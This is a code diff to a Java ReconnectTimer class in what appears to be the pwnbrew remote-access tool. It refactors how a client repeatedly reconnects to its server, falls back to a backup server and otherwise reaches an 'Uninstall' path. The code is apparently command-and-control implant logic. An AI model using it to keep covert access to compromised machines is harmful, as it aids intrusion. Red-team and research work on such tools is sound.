@@ -54,7 +54,6 @@ import java.util.Queue;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.logging.Level;
-import java.util.logging.Logger;
 import pwnbrew.ClientConfig;
 import pwnbrew.Persistence;
 import pwnbrew.concurrent.LockListener;
@@ -73,38 +72,42 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
     private PortManager theCommManager = null;
     
     //Static instance
-    private static ReconnectTimer theTimer = null;
+//    private static ReconnectTimer theTimer = null;
     private final Queue<String> theReconnectTimeList = new LinkedList<>();    
     private int lockVal = 0;
     
     private static final String NAME_Class = ReconnectTimer.class.getSimpleName();
     private String backupServerIp = null;
     private int backupServerPort = -1;
+    
+    private final int theChannelId;
            
 
     // ==========================================================================
     /**
      * Constructor
      *
+     * @param channelId
     */
-    private ReconnectTimer() {
+    public ReconnectTimer( int channelId ) {
         super(Constants.Executor);
+        theChannelId = channelId;
     }
     
-    // ==========================================================================
-    /**
-     *   Ensures that there is only ever one DetectionManager instance
-     * @return 
-     */
-    public synchronized static ReconnectTimer getReconnectTimer() {
-
-        if( theTimer == null ) {
-            theTimer = new ReconnectTimer();
-        }
-        
-        return theTimer;
-
-    }/* END getReconnectTimer() */
+//    // ==========================================================================
+//    /**
+//     *   Ensures that there is only ever one DetectionManager instance
+//     * @return 
+//     */
+//    public synchronized static ReconnectTimer getReconnectTimer() {
+//
+//        if( theTimer == null ) {
+//            theTimer = new ReconnectTimer();
+//        }
+//        
+//        return theTimer;
+//
+//    }/* END getReconnectTimer() */
     
      // ==========================================================================
     /**
@@ -148,7 +151,7 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
     @Override
     public void go() {
         
-        boolean connected = false;
+        int connected = 0;
         
         //Get the socket router
         ClientConfig theConf = ClientConfig.getConfig();
@@ -179,7 +182,7 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
             theCalendar.add(Calendar.SECOND, 5 );
             Date theDate = theCalendar.getTime();
             
-            while( !connected && !shutdownRequested ){
+            while( connected == 0 && !shutdownRequested ){
             
                 String reconnectTime;
                 synchronized(theReconnectTimeList){
@@ -210,7 +213,7 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
                 if( theDate != null ){
                     
                     waitUntil(theDate);  
-                    connected = aPR.getConnectionManager().ensureConnectivity( serverIp, thePort, this );
+                    connected = aPR.ensureConnectivity( serverIp, thePort, this, theChannelId );
                     theDate = null;
                    
                 } else  {
@@ -224,11 +227,12 @@ public class ReconnectTimer extends ManagedRunnable implements LockListener {
         }
         
         //Uninstall
-        if( !connected ){
+        if( connected == 0 ){
             
             if( backupServerIp != null && backupServerPort != -1 ){
-                connected = aPR.ensureConnectivity(backupServerIp, backupServerPort, this);
-                if( connected ){
+                connected = aPR.ensureConnectivity(backupServerIp, backupServerPort, this, theChannelId);
+                if( connected != 0 ){
+                    
                     theConf.setServerIp(backupServerIp);
                     theConf.setSocketPort( Integer.toString( backupServerPort ));
                     
